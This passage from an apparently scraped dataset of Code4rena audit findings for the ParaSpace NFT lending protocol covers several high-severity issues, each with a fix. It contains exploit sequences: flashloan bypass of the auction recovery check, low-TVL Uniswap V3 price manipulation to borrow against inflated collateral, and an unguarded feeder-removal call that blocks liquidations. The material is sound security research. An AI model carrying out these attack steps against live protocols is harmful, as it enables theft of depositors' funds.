      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/482",
      "tags": [],
      "finders": [
        "Jeiwan",
        "minhquanym",
        "gzeon",
        "brgltd",
        "hyh"
      ]
    },
    {
      "id": "15980",
      "title": "[H-07] User can pass auction recovery health check easily with flashloan",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/pool/PoolParameters.sol#L281>\n\nParaSpace features an auction mechanism to liquidate user's NFT holdings and receive fair value. User has the option, before liquidation actually happens but after auction started, to top up their account to above recovery factor (> 1.5 instead of > 1) and use `setAuctionValidityTime()` to invalidate the auction.\n\n    require(\n        erc721HealthFactor > ps._auctionRecoveryHealthFactor,\n        Errors.ERC721_HEALTH_FACTOR_NOT_ABOVE_THRESHOLD\n    );\n    userConfig.auctionValidityTime = block.timestamp;\n\nThe issue is that the check validates the account is topped in the moment the TX is executed. Therefore, user may very easily make it appear they have fully recovered by borrowing a large amount of funds, depositing them as collateral, registering auction invalidation, removing the collateral and repaying the flash loan. Reentrancy guards are not effective to prevent this attack because all these actions are done in a sequence, one finishes before the other begins. However, it is clear user cannot immediately finish this attack below liquidation threshold because health factor check will not allow it.\n\nStill, the recovery feature is a very important feature of the protocol and a large part of what makes it unique, which is why I think it is very significant that it can be bypassed.<br>\nI am on the fence on whether this should be HIGH or MED level impact, would support judge's verdict either way.\n\n### Impact\n\nUser can pass auction recovery health check easily with flashloan.\n\n### Proof of Concept\n\n1.  User places NFT as collateral in the protocol\n2.  User borrows using the NFT as collateral\n3.  NFT price drops and health factor is lower than liquidation threshold\n4.  Auction to sell NFT initiates\n5.  User deposits just enough to be above liquidation threshold\n6.  User now flashloans 1000 WETH\n    1.  supply 1000 WETH to the protocol\n    2.  call setAuctionValidityTime(), cancelling the auction\n    3.  withdraw the 1000 WETH from the protocol\n    4.  pay back the 1000 WETH flashloan\n7.  End result is bypassing of recovery health check\n\n### Recommended Mitigation Steps\n\nIn order to know user has definitely recovered, implement it as a function which holds the user's assets for X time (at least 5 minutes), then releases it back to the user and cancelling all their auctions.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/478#issuecomment-1400967168):**\n > I agree with high risk for this. It's a direct attack on the intended functionality of the protocol that can result in a liquidation delay and potential loss of funds.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an auction mechanism in the ParaSpace protocol that allows users to liquidate their NFT holdings and receive fair value. The issue is that users can bypass the recovery health check by borrowing a large amount of funds, depositing them as collateral, registering auction invalidation, removing the collateral and repaying the flash loan. This bug was found using manual audit and has been classified as a HIGH or MED level impact.\n\nTo mitigate this issue, it is recommended to implement a function that holds the user's assets for at least five minutes before releasing them back to the user and cancelling all their auctions. This will ensure that the user has definitely recovered and the auction invalidation is valid.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/478",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "15979",
      "title": "[H-06] Discrepency in the Uniswap V3 position price calculation because of decimals",
      "impact": "HIGH",
      "content": "\nWhen the squared root of the Uniswap V3 position is calculated from the [`_getOracleData()` function](https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L221-L280), the price may return a very high number (in the case that the token1 decimals are strictly superior to the token0 decimals). See: <https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L249-L260>\n\nThe reason is that at the denominator, the `1E9` (10&ast;&ast;9) value is hard-coded, but should take into account the delta between both decimals.<br>\nAs a result, in the case of `token1Decimal > token0Decimal`, the [`getAmountsForLiquidity()`](https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/dependencies/uniswap/LiquidityAmounts.sol#L172-L205) is going to return a huge value for the amount of token0 and token1 as the user position liquidity.\n\nThe [`getTokenPrice()`](https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L156), using this amount of liquidity to [calculate the token price](https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L176-L180) is as its turn going to return a huge value.\n\n### Proof of Concept\n\nThis POC demonstrates in which case the returned squared root price of the position is over inflated\n\n```solidity\n// SPDX-License-Identifier: UNLISENCED\npragma solidity 0.8.10;\n\nimport {SqrtLib} from \"../contracts/dependencies/math/SqrtLib.sol\";\nimport \"forge-std/Test.sol\";\n\ncontract Audit is Test {\n    function testSqrtPriceX96() public {\n        // ok\n        uint160 price1 = getSqrtPriceX96(1e18, 5 * 1e18, 18, 18);\n\n        // ok\n        uint160 price2 = getSqrtPriceX96(1e18, 5 * 1e18, 18, 9);\n\n        // Has an over-inflated squared root price by 9 magnitudes as token0Decimal < token1Decimal\n        uint160 price3 = getSqrtPriceX96(1e18, 5 * 1e18, 9, 18);\n    }\n\n    function getSqrtPriceX96(\n        uint256 token0Price,\n        uint256 token1Price,\n        uint256 token0Decimal,\n        uint256 token1Decimal\n    ) private view returns (uint160 sqrtPriceX96) {\n        if (oracleData.token1Decimal == oracleData.token0Decimal) {\n            // multiply by 10^18 then divide by 10^9 to preserve price in wei\n            sqrtPriceX96 = uint160(\n                (SqrtLib.sqrt(((token0Price * (10**18)) / (token1Price))) *\n                    2**96) / 1E9\n            );\n        } else if (token1Decimal > token0Decimal) {\n            // multiple by 10^(decimalB - decimalA) to preserve price in wei\n            sqrtPriceX96 = uint160(\n                (SqrtLib.sqrt(\n                    (token0Price * (10**(18 + token1Decimal - token0Decimal))) /\n                        (token1Price)\n                ) * 2**96) / 1E9\n            );\n        } else {\n            // multiple by 10^(decimalA - decimalB) to preserve price in wei then divide by the same number\n            sqrtPriceX96 = uint160(\n                (SqrtLib.sqrt(\n                    (token0Price * (10**(18 + token0Decimal - token1Decimal))) /\n                        (token1Price)\n                ) * 2**96) / 10**(9 + token0Decimal - token1Decimal)\n            );\n        }\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\n```solidity\n        if (oracleData.token1Decimal == oracleData.token0Decimal) {\n            // multiply by 10^18 then divide by 10^9 to preserve price in wei\n            oracleData.sqrtPriceX96 = uint160(\n                (SqrtLib.sqrt(\n                    ((oracleData.token0Price * (10**18)) /\n                        (oracleData.token1Price))\n                ) * 2**96) / 1E9\n            );\n        } else if (oracleData.token1Decimal > oracleData.token0Decimal) {\n            // multiple by 10^(decimalB - decimalA) to preserve price in wei\n            oracleData.sqrtPriceX96 = uint160(\n                (SqrtLib.sqrt(\n                    (oracleData.token0Price *\n                        (10 **\n                            (18 +\n                                oracleData.token1Decimal -\n                                oracleData.token0Decimal))) /\n                        (oracleData.token1Price)\n                ) * 2**96) /\n                    10 **\n                        (9 +\n                            oracleData.token1Decimal -\n                            oracleData.token0Decimal)\n            );\n        } else {\n            // multiple by 10^(decimalA - decimalB) to preserve price in wei then divide by the same number\n            oracleData.sqrtPriceX96 = uint160(\n                (SqrtLib.sqrt(\n                    (oracleData.token0Price *\n                        (10 **\n                            (18 +\n                                oracleData.token0Decimal -\n                                oracleData.token1Decimal))) /\n                        (oracleData.token1Price)\n                ) * 2**96) /\n                    10 **\n                        (9 +\n                            oracleData.token0Decimal -\n                            oracleData.token1Decimal)\n            );\n        }\n```\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the Uniswap V3 Oracle Wrapper contract on the Paraspace platform. The vulnerability occurs when the squared root of the Uniswap V3 position is calculated from the _getOracleData() function. The price may return a very high number if the token1 decimals are strictly superior to the token0 decimals. This is because the 1E9 (10**9) value is hard-coded, but should take into account the delta between both decimals. As a result, the getAmountsForLiquidity() is going to return a huge value for the amount of token0 and token1 as the user position liquidity. The getTokenPrice(), using this amount of liquidity to calculate the token price, is as its turn going to return a huge value.\n\nThe Proof of Concept demonstrates in which case the returned squared root price of the position is over inflated. Recommended mitigation steps include changing the code to take into account the delta between both decimals, as demonstrated in the code snippet provided.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/455",
      "tags": [
        "Uniswap"
      ],
      "finders": [
        "__141345__  poirots",
        "Franfran"
      ]
    },
    {
      "id": "15978",
      "title": "[H-05] Attacker can manipulate low TVL Uniswap V3 pool to borrow and swap to make Lending Pool in loss",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L176>\n\nIn Paraspace protocol, any Uniswap V3 position that are consist of ERC20 tokens that Paraspace support can be used as collateral to borrow funds from Paraspace pool. The value of the Uniswap V3 position will be sum of value of ERC20 tokens in it.\n\n```solidity\nfunction getTokenPrice(uint256 tokenId) public view returns (uint256) {\n    UinswapV3PositionData memory positionData = getOnchainPositionData(\n        tokenId\n    );\n\n    PairOracleData memory oracleData = _getOracleData(positionData);\n\n    (uint256 liquidityAmount0, uint256 liquidityAmount1) = LiquidityAmounts\n        .getAmountsForLiquidity(\n            oracleData.sqrtPriceX96,\n            TickMath.getSqrtRatioAtTick(positionData.tickLower),\n            TickMath.getSqrtRatioAtTick(positionData.tickUpper),\n            positionData.liquidity\n        );\n\n    (\n        uint256 feeAmount0,\n        uint256 feeAmount1\n    ) = getLpFeeAmountFromPositionData(positionData);\n\n    return // @audit can be easily manipulated with low TVL pool\n        (((liquidityAmount0 + feeAmount0) * oracleData.token0Price) /\n            10**oracleData.token0Decimal) +\n        (((liquidityAmount1 + feeAmount1) * oracleData.token1Price) /\n            10**oracleData.token1Decimal);\n}\n```\n\nHowever, Uniswap V3 can have multiple pools for the **same pairs** of ERC20 tokens with **different fee** params. A fews has most the liquidity, while other pools have extremely little TVL or even not created yet. Attackers can abuse it, create low TVL pool where liquidity in this pool mostly (or fully) belong to attackers position, deposit this position as collateral and borrow token in Paraspace pool, swap to make the original position reduce the original value and cause Paraspace pool in loss.\n\n### Proof of Concept\n\nConsider the scenario where WETH and DAI are supported as collateral in Paraspace protocol.\n\n1.  Alice (attacker) create a new WETH/DAI pool in Uniswap V3 and add liquidity with the following amount<br>\n    `1e18 wei WETH - 1e6 wei DAI = 1 WETH - 1e-12 DAI ~= 1 ETH`<br>\n    Let's just assume Alice position has price range from `[MIN_TICK, MAX_TICK]` so the math can be approximately like Uniswap V2 - constant product.<br>\n    Note that this pool only has liquidity from Alice.\n2. Alice deposit this position into Paraspace, value of this position is approximately `1 WETH` and Alice borrow maximum possible amount of USDC.\n3. Alice make swap in her WETH/DAI pool in Uniswap V3 to make the position become<br>\n    `1e6 wei WETH - 1e18 wei DAI = 1e-12 WETH - 1 DAI ~= 1 DAI`\n\nPlease note that the math I've done above is approximation based on Uniswap V2 formula `x * y = k` because Alice provided liquidity from `MIN_TICK` to `MAX_TICK`.<br>\nFor more information about Uniswap V3 formula, please check their whitepaper here: <https://uniswap.org/whitepaper-v3.pdf>.\n\n### Recommended Mitigation Steps\n\nConsider adding whitelist, only allowing pool with enough TVL to be collateral in Paraspace protocol.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/407#issuecomment-1376406262):** \n> Overinflated severity\n\n**[minhquanym (warden) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/407#issuecomment-1400899415):**\n > Hi @LSDan,\n> Maybe there is a misunderstanding here. I believed I gave enough proof to make it a High issue and protocol can be at loss.<br>\n> You can think of it as using Uniswap V3 pool as a price Oracle. However, it did not even use TWA price but spot price and pool with low liquidity is really easy to be manipulated. We all can see many examples about Price manipulation attacks recently and they had a common cause that price can be changed in one block.<br>\n> About the Uniswap V3 pool with low liquidity, you can check out this one https://etherscan.io/address/0xbb256c2F1B677e27118b0345FD2b3894D2E6D487.<br>\n> This is a USDC-USDT pool with only `$8k` in it.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/407#issuecomment-1403968688):**\n > This is not true because Alice's pool will be immediately arbed each time she attempts a price manipulation. Accordingly, this issue only exists when a pair has very low liquidity on UniV3 and no liquidity elsewhere. I would have accepted this as a QA, but it does not fall into the realm of a high risk issue.\n> \n> I'm open to accepting this as a medium if you can give me a more concrete scenario where the value that Alice is extracting from the protocol through this attack is sustainable and significant enough to exceed the gas price of creating a new UniV3 pool.\n\n**[minhquanym (warden) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/407#issuecomment-1404042265):**\n > @LSDan, Please correct me if I'm wrong but I don't think Alice's pool can be arbed when the whole attack happens in 1 transaction. Because of that, I still believe that this is a High. For example, \n> 1. price before manipulation is `p1`\n> 2. flash loan and swap to change the price to `p2`\n> 3. add liquidity and borrow at price `p2`\n> 4. change the price back to `p1`\n> 5. repay the flash loan\n> \n> That's basically the idea. You can see price is back to `p1` at the end. \n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-paraspace-findings/issues/407#issuecomment-1404876330):**\n > Ok yeah... I see what you're saying now. This could be used to drain the pool because the underlying asset price comes from a different oracle. So if Alice creates a pool with 100 USDC and 100 USDT, and drops 3mm USDC from a flash loan into it, the external oracle will value the LP at `$3mm`. High makes sense. Thanks for the additional clarity.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Paraspace protocol, which allows users to use Uniswap V3 positions as collateral to borrow funds from Paraspace pools. Uniswap V3 has multiple pools for the same pairs of ERC20 tokens with different fee parameters. Attackers can abuse this vulnerability by creating low TVL pools where the liquidity mostly or fully belongs to their own position, and then deposit this position as collateral and borrow token in Paraspace pool. This would allow them to reduce the original value of the position and cause Paraspace pool to suffer a loss. \n\nThe recommended mitigation steps for this vulnerability is to consider adding a whitelist, only allowing pools with enough TVL to be collateral in Paraspace protocol. This would help prevent attackers from creating low TVL pools and exploiting the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/407",
      "tags": [
        "Oracle"
      ],
      "finders": [
        "minhquanym"
      ]
    },
    {
      "id": "15977",
      "title": "[H-04] Anyone can prevent themselves from being liquidated as long as they hold one of the supported NFTs",
      "impact": "HIGH",
      "content": "\nContrary to what the function comments say, `removeFeeder()` is able to be called by anyone, not just the owner. By removing all feeders (i.e. floor twap price oracle keepers), a malicious user can cause all queries for the price of NFTs reliant on the `NFTFloorOracle` (all NFTs except for the UniswapV3 ones), to revert, which will cause all calls to `liquidateERC721()` to revert.\n\n### Impact\n\nIf NFTs can't be liquidated, positions will remain open for longer than they should, and the protocol may become insolvent by the time the issue is resolved.\n\n### Proof of Concept\n\nThe `onlyRole(DEFAULT_ADMIN_ROLE)` should have been used instead of `onlyWhenFeederExisted`...\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #1\n\n165      /// @notice Allows owner to remove feeder.\n166      /// @param _feeder feeder to remove\n167      function removeFeeder(address _feeder)\n168          external\n169          onlyWhenFeederExisted(_feeder)\n170      {\n171          _removeFeeder(_feeder);\n172:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L165-L172><br>\n\n... since `onlyWhenFeederExisted` is already on the internal call to `_removeFeeder()` (`onlyWhenFeederExisted` doesn't do any authentication of the caller):\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #2\n\n326      function _removeFeeder(address _feeder)\n327          internal\n328          onlyWhenFeederExisted(_feeder)\n329      {\n330          uint8 feederIndex = feederPositionMap[_feeder].index;\n331          if (feederIndex >= 0 && feeders[feederIndex] == _feeder) {\n332              feeders[feederIndex] = feeders[feeders.length - 1];\n333              feeders.pop();\n334          }\n335          delete feederPositionMap[_feeder];\n336          revokeRole(UPDATER_ROLE, _feeder);\n337          emit FeederRemoved(_feeder);\n338:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L326-L338><br>\n\nNote that `feeders` must have the `UPDATER_ROLE` (revoked above) in order to update the price.\n\nThe fetching of the price will revert if the price is stale:\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #3\n\n234      /// @param _asset The nft contract\n235      /// @return price The most recent price on chain\n236      function getPrice(address _asset)\n237          external\n238          view\n239          override\n240          returns (uint256 price)\n241      {\n242          uint256 updatedAt = assetPriceMap[_asset].updatedAt;\n243          require(\n244 @>           (block.number - updatedAt) <= config.expirationPeriod,\n245              \"NFTOracle: asset price expired\"\n246          );\n247          return assetPriceMap[_asset].twap;\n248:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L234-L248><br>\n\nAnd it will become stale if there are no feeders for enough time:\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #4\n\n195      function setPrice(address _asset, uint256 _twap)\n196          public\n197 @>       onlyRole(UPDATER_ROLE)\n198          onlyWhenAssetExisted(_asset)\n199          whenNotPaused(_asset)\n200      {\n201          bool dataValidity = false;\n202          if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender)) {\n203 @>           _finalizePrice(_asset, _twap);\n204              return;\n205          }\n206          dataValidity = _checkValidity(_asset, _twap);\n207          require(dataValidity, \"NFTOracle: invalid price data\");\n208          // add price to raw feeder storage\n209          _addRawValue(_asset, _twap);\n210          uint256 medianPrice;\n211          // set twap price only when median value is valid\n212          (dataValidity, medianPrice) = _combine(_asset, _twap);\n213          if (dataValidity) {\n214 @>           _finalizePrice(_asset, medianPrice);\n215          }\n216:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L195-L216><br>\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #5\n\n376      function _finalizePrice(address _asset, uint256 _twap) internal {\n377          PriceInformation storage assetPriceMapEntry = assetPriceMap[_asset];\n378          assetPriceMapEntry.twap = _twap;\n379 @>       assetPriceMapEntry.updatedAt = block.number;\n380          assetPriceMapEntry.updatedTimestamp = block.timestamp;\n381          emit AssetDataSet(\n382              _asset,\n383              assetPriceMapEntry.twap,\n384              assetPriceMapEntry.updatedAt\n385          );\n386:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L376-L386><br>\n\nNote that the default staleness interval is six hours:\n\n```solidity\nFile: /paraspace-core/contracts/misc/NFTFloorOracle.sol   #6\n\n10   //expirationPeriod at least the interval of client to feed data(currently 6h=21600s/12=1800 in mainnet)\n11   //we do not accept price lags behind to much\n12:  uint128 constant EXPIRATION_PERIOD = 1800;\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L10-L12><br>\n\nThe reverting `getPrice()` function is called from the `ERC721OracleWrapper` where it is not caught:\n\n```solidity\nFile: /paraspace-core/contracts/misc/ERC721OracleWrapper.sol   #7\n\n44       function setOracle(address _oracleAddress)\n45           external\n46           onlyAssetListingOrPoolAdmins\n47       {\n48 @>        oracleAddress = INFTFloorOracle(_oracleAddress);\n49       }\n50   \n...\n54   \n55       function latestAnswer() external view override returns (int256) {\n56 @>        return int256(oracleAddress.getPrice(asset));\n57:      }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ERC721OracleWrapper.sol#L44-L57><br>\n\nAnd neither is it caught from any of the callers further up the chain (note that the fallback oracle can't be hit since the call reverts before that):\n\n```solidity\nFile: /paraspace-core/contracts/misc/ERC721OracleWrapper.sol   #8\n\n10:  contract ERC721OracleWrapper is IEACAggregatorProxy {\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ERC721OracleWrapper.sol#L10><br>\n\n```solidity\nFile: /paraspace-core/contracts/misc/ParaSpaceOracle.sol   #9\n\n114      /// @inheritdoc IPriceOracleGetter\n115      function getAssetPrice(address asset)\n116          public\n117          view\n118          override\n119          returns (uint256)\n120      {\n121          if (asset == BASE_CURRENCY) {\n122              return BASE_CURRENCY_UNIT;\n123          }\n124  \n125          uint256 price = 0;\n126 @>       IEACAggregatorProxy source = IEACAggregatorProxy(assetsSources[asset]);\n127          if (address(source) != address(0)) {\n128 @>           price = uint256(source.latestAnswer());\n129          }\n130          if (price == 0 && address(_fallbackOracle) != address(0)) {\n131              price = _fallbackOracle.getAssetPrice(asset);\n132          }\n133  \n134          require(price != 0, Errors.ORACLE_PRICE_NOT_READY);\n135          return price;\n136:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/ParaSpaceOracle.sol#L114-L136><br>\n\n```solidity\nFile: /paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol   #10\n\n535      function _getAssetPrice(address oracle, address currentReserveAddress)\n536          internal\n537          view\n538          returns (uint256)\n539      {\n540 @>       return IPriceOracleGetter(oracle).getAssetPrice(currentReserveAddress);\n541:     }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol#L535-L541><br>\n\n```solidity\nFile: /paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol : _getUserBalanceForERC721()  #11\n\n388 @>           uint256 assetPrice = _getAssetPrice(\n389                  params.oracle,\n390                  vars.currentReserveAddress\n391              );\n392              totalValue =\n393                  ICollateralizableERC721(vars.xTokenAddress)\n394                      .collateralizedBalanceOf(params.user) *\n395                  assetPrice;\n396:         }\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol#L388-L396><br>\n\n```solidity\nFile: /paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol : calculateUserAccountData()  #12\n\n214                          vars\n215                              .userBalanceInBaseCurrency = _getUserBalanceForERC721(\n216                              params,\n217                              vars\n218:                         );\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/GenericLogic.sol#L214-L218><br>\n\n```solidity\nFile: /paraspace-core/contracts/protocol/libraries/logic/LiquidationLogic.sol   #13\n\n286      function executeLiquidateERC721(\n287          mapping(address => DataTypes.ReserveData) storage reservesData,\n288          mapping(uint256 => address) storage reservesList,\n289          mapping(address => DataTypes.UserConfigurationMap) storage usersConfig,\n290          DataTypes.ExecuteLiquidateParams memory params\n291      ) external returns (uint256) {\n292          ExecuteLiquidateLocalVars memory vars;\n...\n311          (\n312              vars.userGlobalCollateral,\n313              ,\n314              vars.userGlobalDebt, //in base currency\n315              ,\n316              ,\n317              ,\n318              ,\n319              ,\n320              vars.healthFactor,\n321  \n322 @>       ) = GenericLogic.calculateUserAccountData(\n323              reservesData,\n324              reservesList,\n325              DataTypes.CalculateUserAccountDataParams({\n326                  userConfig: userConfig,\n327                  reservesCount: params.reservesCount,\n328                  user: params.borrower,\n329                  oracle: params.priceOracle\n330              })\n331:         );\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/LiquidationLogic.sol#L286-L331><br>\n\n```solidity\nFile: /paraspace-core/contracts/protocol/pool/PoolCore.sol   #14\n\n457      /// @inheritdoc IPoolCore\n458      function liquidateERC721(\n459          address collateralAsset,\n460          address borrower,\n461          uint256 collateralTokenId,\n462          uint256 maxLiquidationAmount,\n463          bool receiveNToken\n464      ) external payable virtual override nonReentrant {\n465          DataTypes.PoolStorage storage ps = poolStorage();\n466  \n467 @>       LiquidationLogic.executeLiquidateERC721(\n468              ps._reserves,\n469              ps._reservesList,\n470:             ps._usersConfig,\n```\n\n<https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/pool/PoolCore.sol#L457-L470><br>\n\nA person close to liquidation can remove all feeders, giving themselves a free option on whether the extra time it takes for the admins to resolve the issue, is enough time for their position to go back into the green. Alternatively, a competitor can analyze what price most liquidations will occur at (based on on-chain data about every user's account health), and can time the removal of feeders for maximum effect. Note that even if the admins re-add the feeders, the malicious user can just remove them again.\n\n### Recommended Mitigation Steps\n\nAdd the `onlyRole(DEFAULT_ADMIN_ROLE)` modifier to `removeFeeder()`.\n\n**[yubo-ruan (Paraspace) confirmed via duplicate issue `#55`](https://github.com/code-423n4/2022-11-paraspace-findings/issues/55#issuecomment-1338712962)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the NFTFloorOracle contract of the Paraspace project. The function `removeFeeder()` is able to be called by anyone, not just the owner. This allows a malicious user to cause all queries for the price of NFTs reliant on the `NFTFloorOracle` to revert, which will cause all calls to `liquidateERC721()` to revert. This will cause positions to remain open for longer than they should, and the protocol may become insolvent by the time the issue is resolved.\n\nThe `onlyRole(DEFAULT_ADMIN_ROLE)` modifier should be used instead of `onlyWhenFeederExisted` in the `removeFeeder()` function. This will ensure that only the owner can call the function.\n\nA person close to liquidation can remove all feeders, giving themselves a free option on whether the extra time it takes for the admins to resolve the issue, is enough time for their position to go back into the green. Alternatively, a competitor can analyze what price most liquidations will occur at (based on on-chain data about every user's account health), and can time the removal of feeders for maximum effect. Note that even if the admins re-add the feeders, the malicious user can just remove them again.\n\nThe recommended mitigation step is to add the `onlyRole(DEFAULT_ADMIN_ROLE)` modifier to the `removeFeeder()` function. This will ensure that only the owner can call the function. Code inspection was used to identify the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "https://github.com/code-423n4/2022-11-paraspace-findings/issues/402",
      "tags": [],
      "finders": [
        "xiaoming90",
        "fatherOfBlocks",
        "BClabs",
        "ali_shehab",
        "pashov",
        "0xNazgul",
        "kaliberpoziomka8552",
        "csanuragjain",
        "Awesome",
        "IllIllI",
        "shark",
        "nicobevi",
        "Aymen0909",
        "Atarpara",
        "hansfriese",
        "chaduke",
        "datapunk",
        "web3er",
        "pzeus",
        "bullseye",
        "Kong",
        "unforgiven"
      ]
    },
    {
      "id": "15976",
      "title": "[H-03] Interest rates are incorrect on Liquidation",
      "impact": "HIGH",
      "content": "\nThe debt tokens are being transferred before calculating the interest rates. But the interest rate calculation function assumes that debt token has not yet been sent thus the outcome `currentLiquidityRate` will be incorrect\n\n### Proof of Concept\n\n1.  Liquidator L1 calls [`executeLiquidateERC20`](https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/protocol/libraries/logic/LiquidationLogic.sol#L161) for a position whose health factor <1\n\n<!---->\n\n    function executeLiquidateERC20(\n            mapping(address => DataTypes.ReserveData) storage reservesData,\n            mapping(uint256 => address) storage reservesList,\n            mapping(address => DataTypes.UserConfigurationMap) storage usersConfig,\n            DataTypes.ExecuteLiquidateParams memory params\n        ) external returns (uint256) {\n\n    ...\n     _burnDebtTokens(liquidationAssetReserve, params, vars);\n    ...\n    }\n\n2.  This internally calls [`_burnDebtTokens`](https://github.com/code-423n4/2022-11-paraspace/blob/main/paraspace-core/contracts/protocol/libraries/logic/LiquidationLogic.sol#L523)\n\n<!---->\n\n        function _burnDebtTokens(\n            DataTypes.ReserveData storage liquidationAssetReserve,\n            DataTypes.ExecuteLiquidateParams memory params,\n            ExecuteLiquidateLocalVars memory vars\n        ) internal {\n           ...\n\n            // Transfers the debt asset being repaid to the xToken, where the liquidity is kept\n            IERC20(params.liquidationAsset).safeTransferFrom(\n                vars.payer,\n                vars.liquidationAssetReserveCache.xTokenAddress,\n                vars.actualLiquidationAmount\n            );\n    ...\n            // Update borrow & supply rate\n            liquidationAssetReserve.updateInterestRates(\n                vars.liquidationAssetReserveCache,\n                params.liquidationAsset,\n                vars.actualLiquidationAmount,\n                0\n            );\n        }\n\n3.  Basically first it transfers the debt asset to xToken using below. This increases the balance of xTokenAddress for liquidationAsset\n\n<!---->\n\n    IERC20(params.liquidationAsset).safeTransferFrom(\n                vars.payer,\n                vars.liquidationAssetReserveCache.xTokenAddress,\n                vars.actualLiquidationAmount\n            );\n\n4.  Now `updateInterestRates` function is called on ReserveLogic.sol#L169\n\n<!---->\n\n    function updateInterestRates(\n            DataTypes.ReserveData storage reserve,\n            DataTypes.ReserveCache memory reserveCache,\n            address reserveAddress,\n            uint256 liquidityAdded,\n            uint256 liquidityTaken\n        ) internal {\n    ...\n    (\n                vars.nextLiquidityRate,\n                